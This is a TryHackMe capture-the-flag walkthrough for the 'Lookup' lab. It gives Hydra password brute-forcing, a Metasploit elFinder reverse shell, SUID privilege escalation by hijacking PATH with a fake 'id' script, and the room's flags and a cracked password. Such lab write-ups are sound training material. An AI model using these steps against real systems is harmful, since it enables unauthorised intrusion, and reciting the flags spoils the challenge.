# 🔥 TryHackMe Walkthrough - Lookup

## 🚀 Enumeration

### 📂 1. Directory Bruteforcing (Gobuster)
```sh
../login.php
```

### 👥 2. User Enumeration (Custom Script)
```sh
python3 lookup-enumeration.py
```

## 🔑 Credential Attacks

### 🔓 3. Password Bruteforcing (Hydra)
```sh
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-form-post "/login.php:username=^USER^&password=^PASS^:Wrong" -v
```
```sh
hydra -l <username> -P <password-list> <target-IP> -t <threads> <protocol>
```
#### 📌 Parameters Explained:
- `-l <username>` → Specify a single username.
- `-L <username-list>` → Use a list of usernames.
- `-p <password>` → Try a single password.
- `-P <password-list>` → Use a wordlist of passwords.
- `<target-IP>` → IP or domain of the target.
- `-t <threads>` → Number of threads (default is 16).
- `<protocol>` → Service to attack (e.g., ssh, ftp, http, etc.).

## 🌐 Subdomain Enumeration

### 📌 4. Add the new subdomain
```sh
echo "<target-IP> files.lookup.thm" >> /etc/hosts
```

## 🐚 Reverse Shell

### 🛠 5. Exploit with Metasploit
```sh
search elfinder 
set RHOST files.lookup.thm
set LHOST tun0
run
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'  # Upgrade to interactive shell
```

## 🔍 Privilege Escalation

### 🔎 6. Finding Interesting Files
```sh
ls -la /home
```
#### 📌 Observations:
- Found `.passwords` and `user.txt`, but need root privilege to access them.

### 🔥 7. Finding SUID Binaries
```sh
find / -perm /4000 2>/dev/null
```
#### 📌 Breakdown:
- `find /` → Search from root.
- `-perm /4000` → Find SUID binaries.
- `2>/dev/null` → Suppress permission errors.

### 🛠 8. Checking `/usr/sbin/pwm`
```sh
ls -la /usr/sbin/pwm
```
#### 📌 Output:
```sh
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
```
✅ It has root privileges!

### 🏆 9. Exploiting `pwm`
```sh
www-data@lookup:/tmp$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```
```sh
id
```
#### 📌 Output:
```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 🔄 10. Manipulating `id` Command
```sh
touch /tmp/id  # Create an empty file
```
```sh
echo '#!/bin/bash' > /tmp/id  # Add shebang
```
```sh
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id  # Fake ID
```
```sh
chmod +x /tmp/id  # Make it executable
```
```sh
export PATH=/tmp:$PATH  # Prioritize our fake 'id'
```
#### ✅ Now when we type:
```sh
id
```
#### 📌 Output:
```sh
uid=1000(think) gid=1000(think) groups=1000(think)
```

### 🔑 11. Running `pwm` Again
```sh
pwm
```
✅ We now have `.passwords` file!

## 🔐 SSH Bruteforcing

### 💥 12. Using Hydra for SSH Login
```sh
hydra -l think -P passwords.txt ssh://lookup.thm
```
#### 📌 Output:
```sh
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
```

## 🎯 Capture the Flags

### 🏆 13. User Flag
```sh
cat user.txt
```
#### 📌 Output:
```sh
38375fb4dd8baa2b2039ac03d92b820e
```

### 🏅 14. Root Flag
```sh
look '' /root/root.txt
```
🔑 Password: `josemario.AKA(think)`

#### 📌 Output:
```sh
5a285a9f257e45c68bb6c9f9f57d18e8
```

🎉 **Congratulations! You have completed the room!** 🎉

---
📌 **Created by c1ph3r1337** 🕶️🔥

